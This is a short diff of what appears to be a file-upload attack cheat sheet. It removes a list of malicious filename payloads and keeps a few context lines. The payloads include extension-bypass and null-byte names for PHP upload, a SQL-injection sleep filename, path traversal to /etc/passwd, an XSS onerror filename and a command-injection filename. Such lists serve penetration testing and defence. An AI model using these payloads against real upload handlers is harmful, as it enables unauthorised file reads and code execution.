@@ -168,25 +168,3 @@ image.png../../../../../../../etc/passwd
 #Command Injection
 ; sleep 10;
 ```
-
-## All Filename payloads
-
-```csharp
-.jpg.php
-.php.jpg
-.php.blah123jpg
-.php%00.gif
-.php\x00.gif
-.php%00.png
-.php\x00.png
-.php%00.jpg
-.php\x00.jpg
-.php......
-.php%20
-.%E2%80%AEphp.jpg
-.js'(select*from(select(sleep(20)))a)+'.extension
-.png../../../../../../../etc/passwd
-'"><img src=x onerror=alert(document.domain)>.extension
-../../../tmp/lol.png
-.; sleep 10;
-```
